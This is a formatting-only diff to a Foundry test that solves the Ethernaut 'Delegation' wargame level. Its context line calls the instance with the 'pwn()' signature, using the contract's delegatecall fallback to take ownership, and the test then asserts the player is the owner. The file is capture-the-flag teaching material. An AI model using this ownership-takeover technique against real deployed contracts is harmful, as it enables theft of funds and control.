@@ -36,7 +36,9 @@ contract TestDelegationSolution is Test, Utils {
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        instance = Delegation(
+            createLevelInstance(ethernaut, Level(address(factory)), 0)
+        );
         vm.stopPrank();
     }
 
@@ -52,7 +54,6 @@ contract TestDelegationSolution is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public {
-
         // goal: claim the ownership of the contract
 
         // the ownership of Delegation contract can be claimed by triggering
@@ -64,8 +65,8 @@ contract TestDelegationSolution is Test, Utils {
         address(instance).call{value: 0}(abi.encodeWithSignature("pwn()"));
 
         console.log(instance.owner());
-        
-        // i'm not lying 
+
+        // i'm not lying
         assertEq(instance.owner(), player);
     }
 }
